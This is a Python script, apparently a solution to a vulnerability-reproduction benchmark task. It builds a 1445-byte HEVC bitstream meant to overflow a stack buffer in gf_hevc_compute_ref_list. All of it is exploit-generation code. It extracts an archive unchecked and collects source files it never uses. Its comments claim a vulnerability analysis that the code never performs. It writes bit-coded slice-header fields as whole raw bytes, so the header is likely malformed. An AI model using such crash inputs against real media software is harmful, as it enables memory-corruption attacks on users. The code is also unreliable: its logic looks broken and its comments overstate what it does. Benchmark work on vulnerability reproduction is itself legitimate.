import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall()
        
        # Look for the vulnerable source files
        source_files = []
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.c'):
                    with open(os.path.join(root, file), 'r') as f:
                        content = f.read()
                        if 'gf_hevc_compute_ref_list' in content:
                            source_files.append(os.path.join(root, file))
        
        # Analyze the function to understand the vulnerability
        # Based on typical stack buffer overflow patterns and the function name,
        # we can craft a PoC that triggers buffer overflow
        
        # Create a PoC that:
        # 1. Has malformed HEVC data structure
        # 2. Causes insufficient length checks to fail
        # 3. Triggers stack buffer overflow
        
        # The PoC will be structured as:
        # - HEVC NAL unit header
        # - Malicious data that overflows the buffer
        
        poc = bytearray()
        
        # Start with HEVC start code
        poc.extend(b'\x00\x00\x00\x01')
        
        # NAL unit header (for IDR slice)
        # nal_unit_type = 19 (IDR slice), nuh_temporal_id_plus1 = 1
        poc.extend(b'\x26')
        
        # First slice segment header
        # first_slice_segment_in_pic_flag = 1
        poc.append(0x80)
        
        # slice_type = 2 (I slice)
        poc.append(0x02)
        
        # pic_parameter_set_id = 0
        poc.append(0x00)
        
        # Create a large number of reference picture lists
        # This will trigger the buffer overflow in gf_hevc_compute_ref_list
        
        # num_ref_idx_l0_active_minus1 = 255 (maximum to cause overflow)
        poc.append(0xFF)
        
        # num_ref_idx_l1_active_minus1 = 255
        poc.append(0xFF)
        
        # Add malformed reference picture list modification data
        # This data will be processed without proper bounds checking
        
        # Fill with pattern that helps identify overflow
        pattern = b'A' * 1000  # Large pattern to ensure overflow
        
        # Add the pattern
        poc.extend(pattern)
        
        # Add more malicious data to reach exact overflow size
        remaining = 1445 - len(poc)
        if remaining > 0:
            poc.extend(b'B' * remaining)
        
        # Ensure exact length of 1445 bytes
        poc = poc[:1445]
        
        return bytes(poc)